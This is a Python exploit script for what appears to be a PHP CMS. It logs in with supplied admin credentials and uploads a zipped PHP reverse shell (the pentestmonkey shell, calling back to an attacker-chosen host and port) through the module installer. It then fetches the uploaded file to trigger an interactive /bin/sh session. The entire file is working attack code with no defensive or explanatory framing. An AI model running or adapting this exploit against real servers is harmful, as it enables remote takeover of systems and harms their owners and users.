import requests
import argparse
import urllib.parse
import zipfile
from requests_toolbelt.multipart.encoder import MultipartEncoder


def main():
    parser = argparse.ArgumentParser(description="Parse for needed arguments")

    # Define the arguments
    parser.add_argument('-H', '--target_host', type=str, required=True, help='Target host IP address - http://example.com')
    parser.add_argument('-u', '--user', type=str, required=True, help='Username')
    parser.add_argument('-p', '--password', type=str, required=True, help='Password')
    parser.add_argument('-lhost', '--lhost', type=str, required=True, help='Listening host IP')
    parser.add_argument('-lport', '--lport', type=str, required=True, help='Listening port')

    # Parse the arguments
    args = parser.parse_args()

    # Initialize variables
    hostname = args.target_host
    login_url = hostname + "/login.php"
    upload_url = hostname + "/admin.php?action=installmodule"
    user = args.user
    password = args.password
    lhost = args.lhost
    lport = args.lport
    headers = {"Referer": login_url,}

    # Create the reverse shell file
    filename = 'rev.php'
    filecontent = f"""<?php
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '{lhost}'; 
$port = {lport};""" + "\n" + """$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
"""

    # Save php rev shell to file
    with open(filename, 'w') as file:
        file.write(filecontent)

    # Step 2: Zip the file
    zip_filename = 'rev.zip'
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        zipf.write(filename, arcname=filename)

    # Create login data
    login_data = {"cont1": password, user: "","submit": "Log in"}

    # create file upload
    multipart_data = MultipartEncoder(
        fields={
            "sendfile": ("payload.zip", open(zip_filename, "rb"), "application/zip"),
            "submit": "Upload"
        }    
    )

    session = requests.Session()
    login_response = session.post(login_url, headers=headers, data=login_data)


    if login_response.status_code == 200:
        print(f"[+]Logged in as {user}")
        print(f"[+]Attempting to upload {filename} to {upload_url}")
        print(f"[+]Check your listener on port: {lport}")

        upload_headers = {
            "Referer": upload_url,
            "Content-Type": multipart_data.content_type
        }
        upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)

    else:
        print("[-]Unable to login, check username and password")

    payload_url=f"{hostname}/data/modules/payload/" + filename

    requests.get(payload_url)


    
if __name__ == "__main__":
    main()

